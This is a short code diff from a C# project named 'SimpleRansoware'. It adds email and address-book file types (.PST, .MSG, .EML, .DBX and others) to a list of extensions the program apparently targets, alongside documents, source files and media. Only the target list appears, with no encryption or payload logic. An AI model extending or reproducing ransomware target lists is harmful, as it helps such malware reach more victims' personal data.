@@ -33,7 +33,8 @@ namespace SimpleRansoware
             ".ZIP", ".RAR", ".TAR", ".GZ",
             ".CS", ".VB", ".JAVA", ".CLASS", ".JS", ".VBS", ".CSC", ".JSON", ".TXT", ".C", ".CPP", ".H", ".CONFIG", ".PY", ".R", ".XAML", ".JSP", ".PHP",
             ".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT", ".PPTX",
-            ".MP3", ".MP4", ".AVI", ".MPEG"
+            ".MP3", ".MP4", ".AVI", ".MPEG",
+            ".PST", ".MSG", ".EML", ".DBX", ".MBX", ".WAB"
         };
 
         /// <summary>
